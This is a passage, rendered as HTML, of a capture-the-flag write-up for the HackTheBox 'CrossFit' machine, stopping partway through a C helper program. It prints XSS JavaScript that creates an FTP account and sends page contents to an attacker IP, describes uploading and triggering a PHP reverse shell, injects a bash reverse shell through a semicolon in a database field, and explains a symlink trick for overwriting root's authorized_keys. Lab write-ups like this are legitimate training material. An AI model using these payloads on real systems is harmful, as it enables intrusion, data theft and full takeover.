+<div style="position:absolute;left:63.50px;top:153.05px" class="cls_020"><span class="cls_020">req4.</span><span class="cls_022">send</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:171.05px" class="cls_024"><span class="cls_024">/*PARSING THE REQUEST*/</span></div>
+<div style="position:absolute;left:63.50px;top:189.05px" class="cls_020"><span class="cls_020">response2 = req4.responseText;</span></div>
+<div style="position:absolute;left:63.50px;top:207.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">parser = </span><span class="cls_019">new</span><span class="cls_020"> </span><span class="cls_022">DOMParser</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:225.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">doc =</span><span class="cls_018"> </span><span class="cls_020">parser.</span><span class="cls_022">parseFromString</span><span class="cls_020">(response2,</span><span class="cls_021">'text/html'</span><span class="cls_020">);</span></div>
+<div style="position:absolute;left:63.50px;top:243.05px" class="cls_020"><span class="cls_020">token =</span><span class="cls_018"> </span><span class="cls_020">doc.</span><span class="cls_022">getElementsByName</span><span class="cls_020">(</span><span class="cls_021">"_token"</span><span class="cls_020">)[</span><span class="cls_023">0</span><span class="cls_020">].value; </span><span class="cls_024">/*retrieving</span><span class="cls_018"> </span><span class="cls_024">the</span><span class="cls_018"> </span><span class="cls_024">token</span></div>
+<div style="position:absolute;left:63.50px;top:261.05px" class="cls_024"><span class="cls_024">value*/</span></div>
+<div style="position:absolute;left:63.50px;top:297.05px" class="cls_024"><span class="cls_024">/*POST REQUEST TO CREATE A USER*/</span></div>
+<div style="position:absolute;left:63.50px;top:315.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">target = </span><span class="cls_021">'http://ftp.crossfit.htb/accounts'</span><span class="cls_020">;</span></div>
+<div style="position:absolute;left:63.50px;top:333.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">req = </span><span class="cls_019">new</span><span class="cls_020"> </span><span class="cls_022">XMLHttpRequest</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:351.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">params = </span><span class="cls_021">'username=hello&pass=bhosa&_token='</span><span class="cls_020">+token;</span></div>
+<div style="position:absolute;left:63.50px;top:369.05px" class="cls_020"><span class="cls_020">req.</span><span class="cls_022">open</span><span class="cls_020">(</span><span class="cls_021">'POST'</span><span class="cls_020">,</span><span class="cls_018"> </span><span class="cls_020">target, </span><span class="cls_023">false</span><span class="cls_020">);</span></div>
+<div style="position:absolute;left:63.50px;top:387.05px" class="cls_020"><span class="cls_020">req.withCredentials = </span><span class="cls_023">true</span><span class="cls_020">;</span></div>
+<div style="position:absolute;left:63.50px;top:405.05px" class="cls_020"><span class="cls_020">req.</span><span class="cls_022">setRequestHeader</span><span class="cls_020">(</span><span class="cls_021">'Content-Type'</span><span class="cls_020">, </span><span class="cls_021">'application/x-www-form-urlencoded'</span><span class="cls_020">);</span></div>
+<div style="position:absolute;left:63.50px;top:423.05px" class="cls_020"><span class="cls_020">req.</span><span class="cls_022">send</span><span class="cls_020">(params);</span></div>
+<div style="position:absolute;left:63.50px;top:459.05px" class="cls_024"><span class="cls_024">/*VIEWING THE MAIN PAGE TO SEE IF A USER IS CREATED*/</span></div>
+<div style="position:absolute;left:63.50px;top:477.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">target1 = </span><span class="cls_021">'http://ftp.crossfit.htb/'</span><span class="cls_020">;</span></div>
+<div style="position:absolute;left:63.50px;top:495.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">req3 = </span><span class="cls_019">new</span><span class="cls_020"> </span><span class="cls_022">XMLHttpRequest</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:513.05px" class="cls_020"><span class="cls_020">req3.</span><span class="cls_022">open</span><span class="cls_020">(</span><span class="cls_021">'GET'</span><span class="cls_020">,target1,</span><span class="cls_023">false</span><span class="cls_020">);</span></div>
+<div style="position:absolute;left:63.50px;top:531.05px" class="cls_020"><span class="cls_020">req3.</span><span class="cls_022">send</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:549.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">response =</span><span class="cls_018"> </span><span class="cls_020">req3.responseText;</span></div>
+<div style="position:absolute;left:63.50px;top:585.05px" class="cls_024"><span class="cls_024">/*attacker request*/</span></div>
+<div style="position:absolute;left:63.50px;top:603.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">attacker = </span><span class="cls_021">'http://10.10.14.47/result='</span><span class="cls_020">+</span><span class="cls_022">btoa</span><span class="cls_020">(response);</span></div>
+<div style="position:absolute;left:63.50px;top:621.05px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">req2 = </span><span class="cls_019">new</span><span class="cls_020"> </span><span class="cls_022">XMLHttpRequest</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:639.05px" class="cls_020"><span class="cls_020">req2.</span><span class="cls_022">open</span><span class="cls_020">(</span><span class="cls_021">'GET'</span><span class="cls_020">,attacker,</span><span class="cls_023">true</span><span class="cls_020">);</span></div>
+<div style="position:absolute;left:63.50px;top:657.05px" class="cls_020"><span class="cls_020">req2.</span><span class="cls_022">send</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:690.50px" class="cls_006"><span class="cls_006">This javascript will first search fot token and then use that token to send a post</span></div>
+<div style="position:absolute;left:63.50px;top:708.50px" class="cls_006"><span class="cls_006">request to create a new user and then we again ask for the main page and then sent</span></div>
+<div style="position:absolute;left:63.50px;top:726.50px" class="cls_006"><span class="cls_006">back the index.html file to find a new user created.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:7218px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background10.jpg" width=612 height=792></div>
+<div style="position:absolute;left:49.25px;top:30.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> Here </span><span class="cls_016">req.withCredentials</span><span class="cls_006">  is used to keep the seesion alive.</span></div>
+<div style="position:absolute;left:49.25px;top:50.00px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> </span><span class="cls_016">params</span><span class="cls_006">  is a variable to store the POST data and then send via </span><span class="cls_016">send()</span><span class="cls_006">  command.</span></div>
+<div style="position:absolute;left:49.25px;top:69.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> Incase of </span><span class="cls_016">open()</span><span class="cls_006">  function we use </span><span class="cls_016">false</span><span class="cls_006">  for all requests except the final one,because</span></div>
+<div style="position:absolute;left:63.50px;top:89.00px" class="cls_006"><span class="cls_006">false means that the code can move to next line only after we get a response for the</span></div>
+<div style="position:absolute;left:63.50px;top:107.00px" class="cls_006"><span class="cls_006">request,this makes sure that all requests happen competely.</span></div>
+<div style="position:absolute;left:51.50px;top:143.00px" class="cls_012"><span class="cls_012">USING THIS WE CREATE A NEW USER AND THIS USER CAN BE USED TO LOGIN TO THE</span></div>
+<div style="position:absolute;left:51.50px;top:161.00px" class="cls_012"><span class="cls_012">FTP SERVICE HOSTED ON PORT 21</span><span class="cls_013"></span></div>
+<div style="position:absolute;left:51.50px;top:377.75px" class="cls_009"><span class="cls_009">LFTP</span></div>
+<div style="position:absolute;left:63.50px;top:411.50px" class="cls_006"><span class="cls_006">NORMALLY FTP is used to login but in this case ftp seems to have a ssl certificate.</span></div>
+<div style="position:absolute;left:63.50px;top:429.50px" class="cls_006"><span class="cls_006">Because of which we need to use lftp to make a conection.</span></div>
+<div style="position:absolute;left:63.50px;top:468.05px" class="cls_020"><span class="cls_020">lftp</span></div>
+<div style="position:absolute;left:63.50px;top:486.05px" class="cls_020"><span class="cls_020">lftp</span><span class="cls_018"> </span><span class="cls_020">:~> </span><span class="cls_022">set</span><span class="cls_018"> </span><span class="cls_020">ftp:ssl-force </span><span class="cls_023">true</span></div>
+<div style="position:absolute;left:63.50px;top:504.05px" class="cls_020"><span class="cls_020">lftp</span><span class="cls_018"> </span><span class="cls_020">:~> </span><span class="cls_022">set</span><span class="cls_018"> </span><span class="cls_020">ssl:verify-certificate</span><span class="cls_018"> </span><span class="cls_020">no</span></div>
+<div style="position:absolute;left:63.50px;top:522.05px" class="cls_020"><span class="cls_020">lftp</span><span class="cls_018"> </span><span class="cls_020">:~></span><span class="cls_018"> </span><span class="cls_020">connect </span><span class="cls_023">10.129</span><span class="cls_020">.121.115</span></div>
+<div style="position:absolute;left:63.50px;top:540.05px" class="cls_020"><span class="cls_020">lftp </span><span class="cls_023">10.129</span><span class="cls_020">.121.115:~></span><span class="cls_018"> </span><span class="cls_020">login</span><span class="cls_018"> </span><span class="cls_020">hello</span></div>
+<div style="position:absolute;left:63.50px;top:558.05px" class="cls_020"><span class="cls_020">Password:</span></div>
+<div style="position:absolute;left:63.50px;top:591.50px" class="cls_006"><span class="cls_006">The ftp was a dump of all the contents of </span><span class="cls_016">/var/www</span></div>
+<div style="position:absolute;left:63.50px;top:611.00px" class="cls_006"><span class="cls_006">Incase of </span><span class="cls_016">development-test</span><span class="cls_006">  sub-domain one could </span><span class="cls_016">put</span><span class="cls_006">  a file.ALL OTHER SUB</span><span class="cls_005"></span></div>
+<div style="position:absolute;left:63.50px;top:630.50px" class="cls_006"><span class="cls_006">DOMAINS DID NOT ALLOW IT.</span></div>
+<div style="position:absolute;left:63.50px;top:648.50px" class="cls_006"><span class="cls_006">So we put a simple php reverse shell and then try to call it with the same xss vuln.</span></div>
+<div style="position:absolute;left:63.50px;top:687.05px" class="cls_020"><span class="cls_020">lftp</span><span class="cls_018"> </span><span class="cls_020">hello@10.129.121.115:~> </span><span class="cls_022">ls</span></div>
+<div style="position:absolute;left:63.50px;top:704.30px" class="cls_020"><span class="cls_020">drwxrwxr-x</span></div>
+<div style="position:absolute;left:149.13px;top:705.05px" class="cls_023"><span class="cls_023">2 33</span></div>
+<div style="position:absolute;left:216.37px;top:705.05px" class="cls_023"><span class="cls_023">1002</span></div>
+<div style="position:absolute;left:295.87px;top:705.05px" class="cls_023"><span class="cls_023">4096</span><span class="cls_018"> </span><span class="cls_020">Mar </span><span class="cls_023">29</span><span class="cls_020"> </span><span class="cls_023">15</span><span class="cls_020">:15</span><span class="cls_018"> </span><span class="cls_020">development-test</span></div>
+<div style="position:absolute;left:63.50px;top:723.05px" class="cls_020"><span class="cls_020">drwxr-xr-x</span></div>
+<div style="position:absolute;left:143.01px;top:723.05px" class="cls_023"><span class="cls_023">13 0</span></div>
+<div style="position:absolute;left:216.37px;top:723.05px" class="cls_023"><span class="cls_023">0</span></div>
+<div style="position:absolute;left:295.87px;top:723.05px" class="cls_023"><span class="cls_023">4096</span><span class="cls_018"> </span><span class="cls_020">May</span><span class="cls_018"> </span><span class="cls_020">07</span></div>
+<div style="position:absolute;left:375.37px;top:723.05px" class="cls_023"><span class="cls_023">2020</span><span class="cls_020"> </span><span class="cls_022">ftp</span></div>
+<div style="position:absolute;left:63.50px;top:740.30px" class="cls_020"><span class="cls_020">drwxr-xr-x</span></div>
+<div style="position:absolute;left:149.13px;top:741.05px" class="cls_023"><span class="cls_023">9 0</span></div>
+<div style="position:absolute;left:216.37px;top:741.05px" class="cls_023"><span class="cls_023">0</span></div>
+<div style="position:absolute;left:295.87px;top:741.05px" class="cls_023"><span class="cls_023">4096</span><span class="cls_018"> </span><span class="cls_020">May </span><span class="cls_023">12</span></div>
+<div style="position:absolute;left:375.35px;top:741.05px" class="cls_023"><span class="cls_023">2020</span><span class="cls_018"> </span><span class="cls_020">gym-club</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:8020px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background11.jpg" width=612 height=792></div>
+<div style="position:absolute;left:63.50px;top:33.05px" class="cls_020"><span class="cls_020">drwxr-xr-x</span></div>
+<div style="position:absolute;left:149.13px;top:33.05px" class="cls_023"><span class="cls_023">2 0</span></div>
+<div style="position:absolute;left:216.37px;top:33.05px" class="cls_023"><span class="cls_023">0</span></div>
+<div style="position:absolute;left:295.87px;top:33.05px" class="cls_023"><span class="cls_023">4096</span><span class="cls_018"> </span><span class="cls_020">May</span><span class="cls_018"> </span><span class="cls_020">01</span></div>
+<div style="position:absolute;left:375.37px;top:33.05px" class="cls_023"><span class="cls_023">2020</span><span class="cls_018"> </span><span class="cls_020">html</span></div>
+<div style="position:absolute;left:63.50px;top:51.05px" class="cls_020"><span class="cls_020">lftp</span><span class="cls_018"> </span><span class="cls_020">hello@10.129.121.115:/> </span><span class="cls_022">cd</span><span class="cls_018"> </span><span class="cls_020">development-test</span></div>
+<div style="position:absolute;left:63.50px;top:69.05px" class="cls_020"><span class="cls_020">lftp</span><span class="cls_018"> </span><span class="cls_020">hello@10.129.121.115:/development-test> </span><span class="cls_022">ls</span></div>
+<div style="position:absolute;left:63.50px;top:87.05px" class="cls_020"><span class="cls_020">lftp hello@10.129.121.115:/development-test> put bhosa.php</span></div>
+<div style="position:absolute;left:63.50px;top:105.05px" class="cls_023"><span class="cls_023">3461</span><span class="cls_018"> </span><span class="cls_020">bytes</span><span class="cls_018"> </span><span class="cls_020">transferred </span><span class="cls_019">in</span><span class="cls_020"> </span><span class="cls_023">2</span><span class="cls_018"> </span><span class="cls_020">seconds (</span><span class="cls_023">1.5</span><span class="cls_018"> </span><span class="cls_020">KiB/s)</span></div>
+<div style="position:absolute;left:63.50px;top:123.05px" class="cls_020"><span class="cls_020">lftp hello@10.129.121.115:/development-test></span></div>
+<div style="position:absolute;left:51.50px;top:159.50px" class="cls_010"><span class="cls_010">INVOKING THE REVERSE SHELL(using xss)</span></div>
+<div style="position:absolute;left:63.50px;top:205.55px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">target = </span><span class="cls_021">'http://development-test.crossfit.htb/bhosa.php'</span><span class="cls_020">;</span></div>
+<div style="position:absolute;left:63.50px;top:223.55px" class="cls_019"><span class="cls_019">var</span><span class="cls_018"> </span><span class="cls_020">attack = </span><span class="cls_019">new</span><span class="cls_020"> </span><span class="cls_022">XMLHttpRequest</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:241.55px" class="cls_020"><span class="cls_020">attack.</span><span class="cls_022">open</span><span class="cls_020">(</span><span class="cls_021">'GET'</span><span class="cls_020">,target,</span><span class="cls_023">false</span><span class="cls_020">);</span></div>
+<div style="position:absolute;left:63.50px;top:259.55px" class="cls_020"><span class="cls_020">attack.</span><span class="cls_022">send</span><span class="cls_020">();</span></div>
+<div style="position:absolute;left:63.50px;top:277.55px" class="cls_020"><span class="cls_020">resp = attack.responseText;</span></div>
+<div style="position:absolute;left:63.50px;top:311.00px" class="cls_006"><span class="cls_006">This will invoke the script from the admin browser and then give us a connection.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:8822px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background12.jpg" width=612 height=792></div>
+<div style="position:absolute;left:51.50px;top:251.00px" class="cls_006"><span class="cls_006">In this manner we get </span><span class="cls_012">www-data</span><span class="cls_006"> user.</span></div>
+<div style="position:absolute;left:51.50px;top:278.00px" class="cls_002"><span class="cls_002">EXPLOITATION</span></div>
+<div style="position:absolute;left:51.50px;top:327.50px" class="cls_009"><span class="cls_009">HANK USER PRIVESC</span></div>
+<div style="position:absolute;left:51.50px;top:362.00px" class="cls_006"><span class="cls_006">A total enumeration of the box will lead to a ton of hard coded credentials.</span></div>
+<div style="position:absolute;left:63.50px;top:392.00px" class="cls_006"><span class="cls_006">One such credential was found in </span><span class="cls_016">/etc/ansible/playbooks</span><span class="cls_006"> .</span></div>
+<div style="position:absolute;left:63.50px;top:572.75px" class="cls_006"><span class="cls_006">On examination it is found to be a sha512 hash.</span></div>
+<div style="position:absolute;left:63.50px;top:590.75px" class="cls_006"><span class="cls_006">hashcat can be used to crack the password with a satandard rockyou wordlist.</span></div>
+<div style="position:absolute;left:71.00px;top:626.30px" class="cls_016"><span class="cls_016">hashcat -m 1800 hash /root/Desktop/rockyou.txt</span></div>
+<div style="position:absolute;left:51.50px;top:709.25px" class="cls_006"><span class="cls_006">One can login as hank using ssh.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:9624px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background13.jpg" width=612 height=792></div>
+<div style="position:absolute;left:51.50px;top:29.00px" class="cls_009"><span class="cls_009">ISAAC USER PRIVESC</span></div>
+<div style="position:absolute;left:63.50px;top:62.75px" class="cls_006"><span class="cls_006">Hank is in the admins group and there are some files of isaac that belong to the</span></div>
+<div style="position:absolute;left:63.50px;top:80.75px" class="cls_006"><span class="cls_006">admin group.</span></div>
+<div style="position:absolute;left:63.50px;top:216.50px" class="cls_006"><span class="cls_006">Thus the best way we could get to user isaac would be via this path.</span></div>
+<div style="position:absolute;left:63.50px;top:234.50px" class="cls_006"><span class="cls_006">we can also see a script(send_updates.php) being run every minute.</span></div>
+<div style="position:absolute;left:73.25px;top:552.50px" class="cls_006"><span class="cls_006">ANYONE CAN VIEW THE CRON ?</span></div>
+<div style="position:absolute;left:51.50px;top:598.25px" class="cls_010"><span class="cls_010">EXPLOIT IN send_updates.php</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:10426px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background14.jpg" width=612 height=792></div>
+<div style="position:absolute;left:51.50px;top:259.25px" class="cls_012"><span class="cls_012">mikehearlt shellcommand module</span><span class="cls_006"> used here is to execute shell commands in php,but it</span></div>
+<div style="position:absolute;left:51.50px;top:277.25px" class="cls_006"><span class="cls_006">has a bug as it does not escape the arguments correctly because of which one can easily</span></div>
+<div style="position:absolute;left:51.50px;top:295.25px" class="cls_006"><span class="cls_006">escape the commands using a simple semi colon and then insert whatever shell</span></div>
+<div style="position:absolute;left:51.50px;top:313.25px" class="cls_006"><span class="cls_006">commands and effectively gain a rce.</span></div>
+<div style="position:absolute;left:51.50px;top:331.25px" class="cls_012"><span class="cls_012">MORE ABOUT THIS </span><span class="cls_013"></span><span class="cls_006"> </span><A HREF="https://github.com/mikehaertl/php-shellcommand/issues/44">https://github.com/mikehaertl/php-shellcommand/issues/44</A> </span></div>
+<div style="position:absolute;left:51.50px;top:365.75px" class="cls_009"><span class="cls_009">EXPLOIT STRATEGY</span></div>
+<div style="position:absolute;left:63.50px;top:399.50px" class="cls_006"><span class="cls_006">Initial step would be to insert some file in the so called </span><span class="cls_016">$msgdir</span><span class="cls_006">  so that the loop will</span></div>
+<div style="position:absolute;left:63.50px;top:419.00px" class="cls_006"><span class="cls_006">start.</span></div>
+<div style="position:absolute;left:63.50px;top:437.00px" class="cls_006"><span class="cls_006">And then some email needs to be inserted so that the second loop to run the</span></div>
+<div style="position:absolute;left:63.50px;top:455.00px" class="cls_006"><span class="cls_006">vulnerable shell commands will start.</span></div>
+<div style="position:absolute;left:63.50px;top:473.00px" class="cls_006"><span class="cls_006">So some ftpadm user credentials was retrieved via </span><span class="cls_016">pam.d/vsftpd</span><span class="cls_006"> .</span></div>
+<div style="position:absolute;left:63.50px;top:492.50px" class="cls_006"><span class="cls_006">And inside that is a message directory.</span></div>
+<div style="position:absolute;left:63.50px;top:510.50px" class="cls_012"><span class="cls_012">This is the possible directory that we need to populate to trigger the loop</span><span class="cls_006">.</span></div>
+<div style="position:absolute;left:51.50px;top:692.75px" class="cls_006"><span class="cls_006">We populate it with random stuff.</span></div>
+<div style="position:absolute;left:49.25px;top:728.75px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> </span><span class="cls_012">NOW WE NEED TO POPULATE THE CROSSFIT USERS TABLE</span><span class="cls_006">.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:11228px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background15.jpg" width=612 height=792></div>
+<div style="position:absolute;left:49.25px;top:30.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> Credentials for that was found in </span><span class="cls_016">/var/www/gym-club/db.php</span><span class="cls_006"> .</span></div>
+<div style="position:absolute;left:49.25px;top:50.00px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> Using this we login and then feed the email column with our rce code.</span></div>
+<div style="position:absolute;left:49.25px;top:68.00px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> The plan is since it does not escape the argument,we can simply escap it using semi-</span></div>
+<div style="position:absolute;left:63.50px;top:86.00px" class="cls_006"><span class="cls_006">colon and then add a simple bash reverse shell and then again close the command</span></div>
+<div style="position:absolute;left:63.50px;top:104.00px" class="cls_006"><span class="cls_006">using a seni-colon to execute a reverse shell.</span></div>
+<div style="position:absolute;left:51.50px;top:270.50px" class="cls_006"><span class="cls_006">Put some file in messages directory.Now when the cron runs it will enter the first loop and</span></div>
+<div style="position:absolute;left:51.50px;top:288.50px" class="cls_006"><span class="cls_006">then it will iterate through the files and then it will enter the next loop and check for email</span></div>
+<div style="position:absolute;left:51.50px;top:306.50px" class="cls_006"><span class="cls_006">ids in users.</span></div>
+<div style="position:absolute;left:51.50px;top:687.50px" class="cls_006"><span class="cls_006">When it finds a text it will perform a </span><span class="cls_016">/usr/bin/mail</span><span class="cls_006">  on the value but due to semi-colon</span></div>
+<div style="position:absolute;left:51.50px;top:707.00px" class="cls_006"><span class="cls_006">the command will exit and our command will run,and if we dont keep another semi-colon</span></div>
+<div style="position:absolute;left:51.50px;top:725.00px" class="cls_006"><span class="cls_006">then the reverse shell will not work because there are furthur arguments after that.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:12030px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background16.jpg" width=612 height=792></div>
+<div style="position:absolute;left:51.50px;top:30.50px" class="cls_012"><span class="cls_012">We get isaac user using a simple bug in a php module that was not updated.</span></div>
+<div style="position:absolute;left:51.50px;top:57.50px" class="cls_002"><span class="cls_002">PRIVESC</span></div>
+<div style="position:absolute;left:51.50px;top:106.25px" class="cls_003"><span class="cls_003">ROOT PRIVESC</span></div>
+<div style="position:absolute;left:63.50px;top:150.50px" class="cls_006"><span class="cls_006">root privesc is based on reverse engineering which iam very wask in</span></div>
+<div style="position:absolute;left:63.50px;top:168.50px" class="cls_006"><span class="cls_006">Initially we find a binary out of the ordinary in </span><span class="cls_016">/usr/bin/dbmsg</span><span class="cls_006"> .Using the timestyle</span></div>
+<div style="position:absolute;left:63.50px;top:188.00px" class="cls_006"><span class="cls_006">trick.</span></div>
+<div style="position:absolute;left:51.50px;top:315.50px" class="cls_006"><span class="cls_006">And then reversing it will let us know that every minute it creates a file with rand number</span></div>
+<div style="position:absolute;left:51.50px;top:333.50px" class="cls_006"><span class="cls_006">and then it will store the contents of messages column of crossfit db and then zip it and</span></div>
+<div style="position:absolute;left:51.50px;top:351.50px" class="cls_006"><span class="cls_006">then delete.</span></div>
+<div style="position:absolute;left:51.50px;top:385.25px" class="cls_003"><span class="cls_003">EXPLOIT</span></div>
+<div style="position:absolute;left:63.50px;top:429.50px" class="cls_006"><span class="cls_006">We will make sure that we guess the name of the file by creating a c program that will</span></div>
+<div style="position:absolute;left:63.50px;top:447.50px" class="cls_006"><span class="cls_006">calculate the random number by adding a second to a minute.</span></div>
+<div style="position:absolute;left:63.50px;top:465.50px" class="cls_006"><span class="cls_006">And then we will create a symlink for that file that will point to</span></div>
+<div style="position:absolute;left:66.50px;top:485.30px" class="cls_016"><span class="cls_016">/root/.ssh/authorzed_keys.</span></div>
+<div style="position:absolute;left:63.50px;top:503.00px" class="cls_006"><span class="cls_006">Y authorized_keys?</span></div>
+<div style="position:absolute;left:63.50px;top:521.00px" class="cls_006"><span class="cls_006">Because according to the script it will take the second third and fourth column</span></div>
+<div style="position:absolute;left:63.50px;top:539.00px" class="cls_006"><span class="cls_006">contants and then plcae them inthis file with spaces.</span></div>
+<div style="position:absolute;left:63.50px;top:557.00px" class="cls_006"><span class="cls_006">So if we symlink to that authorized_keys file then we can feed the pub key to the</span></div>
+<div style="position:absolute;left:63.50px;top:575.00px" class="cls_006"><span class="cls_006">columns of the table that we have access and then when the cron hits it will write the</span></div>
+<div style="position:absolute;left:63.50px;top:593.00px" class="cls_006"><span class="cls_006">contents to the keys file and then delete the file in </span><span class="cls_016">/var/local</span><span class="cls_006">  and then sshing as</span></div>
+<div style="position:absolute;left:63.50px;top:612.50px" class="cls_006"><span class="cls_006">root.</span></div>
+<div style="position:absolute;left:49.25px;top:648.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> Created a simple c file to create a random number by using rand()</span></div>
+<div style="position:absolute;left:63.50px;top:666.50px" class="cls_006"><span class="cls_006">function with the seed as timestamp + 1 second every minute in such a manner that it</span></div>
+<div style="position:absolute;left:63.50px;top:684.50px" class="cls_006"><span class="cls_006">will show the next timestamp so that based on that we can create a md5 hash of our</span></div>
+<div style="position:absolute;left:63.50px;top:702.50px" class="cls_006"><span class="cls_006">random number and create the file well in hand.</span></div>
+<div style="position:absolute;left:49.25px;top:720.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> And then we add the ssh key files and also the name of the file is appended with the</span></div>
+<div style="position:absolute;left:63.50px;top:738.50px" class="cls_006"><span class="cls_006">id value.SO MAKE SURE THAT RANDOM NUMBER IS SUFFIXED WITH ID BEING USED</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:12832px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background17.jpg" width=612 height=792></div>
+<div style="position:absolute;left:63.50px;top:30.50px" class="cls_006"><span class="cls_006">IN THE DB.</span></div>
+<div style="position:absolute;left:49.25px;top:78.50px" class="cls_005"><span class="cls_005"></span></div>
+<div style="position:absolute;left:85.25px;top:78.50px" class="cls_012"><span class="cls_012">NOTE</span><span class="cls_013"></span><span class="cls_006"> Here a special ssh key is used because it is small and we cant fit in a</span></div>
+<div style="position:absolute;left:85.25px;top:96.50px" class="cls_006"><span class="cls_006">big ssh pub key in a table.</span></div>
+<div style="position:absolute;left:71.00px;top:150.05px" class="cls_016"><span class="cls_016">ssh-keygen -o -a 100 -t ed25519 -f /root/wargames/hackthebox/crossfit/root</span></div>
+<div style="position:absolute;left:49.25px;top:184.25px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> We then wait and then ssh in as root.</span></div>
+<div style="position:absolute;left:49.25px;top:202.25px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> </span><span class="cls_012">SCRIPT PROVIDED</span><span class="cls_006">:</span></div>
+<div style="position:absolute;left:63.50px;top:252.80px" class="cls_025"><span class="cls_025">#</span><span class="cls_019">include</span><span class="cls_025"> </span><span class="cls_021">&lt;stdio.h></span></div>
+<div style="position:absolute;left:63.50px;top:270.80px" class="cls_025"><span class="cls_025">#</span><span class="cls_019">include</span><span class="cls_025"> </span><span class="cls_021">&lt;time.h></span></div>
+<div style="position:absolute;left:63.50px;top:288.80px" class="cls_025"><span class="cls_025">#</span><span class="cls_019">include</span><span class="cls_025"> </span><span class="cls_021">&lt;stdlib.h></span></div>
+<div style="position:absolute;left:63.50px;top:342.80px" class="cls_019"><span class="cls_019">int</span><span class="cls_020"> </span><span class="cls_022">main</span><span class="cls_020">()</span></div>
+<div style="position:absolute;left:63.50px;top:360.80px" class="cls_020"><span class="cls_020">{</span></div>
+<div style="position:absolute;left:87.96px;top:378.80px" class="cls_024"><span class="cls_024">/* code */</span></div>
+<div style="position:absolute;left:87.97px;top:396.05px" class="cls_020"><span class="cls_020">time_t now</span></div>
+<div style="position:absolute;left:155.25px;top:396.80px" class="cls_020"><span class="cls_020">= </span><span class="cls_022">time</span><span class="cls_020">(</span><span class="cls_025">NULL</span><span class="cls_020">); </span><span class="cls_024">/*declare</span><span class="cls_018"> </span><span class="cls_024">the</span><span class="cls_018"> </span><span class="cls_024">time</span><span class="cls_018"> </span><span class="cls_024">variable</span><span class="cls_018"> </span><span class="cls_024">and</span><span class="cls_018"> </span><span class="cls_024">store</span><span class="cls_018"> </span><span class="cls_024">the</span><span class="cls_018"> </span><span class="cls_024">cur</span></div>
+<div style="position:absolute;left:63.50px;top:414.80px" class="cls_024"><span class="cls_024">timestamp*/</span></div>
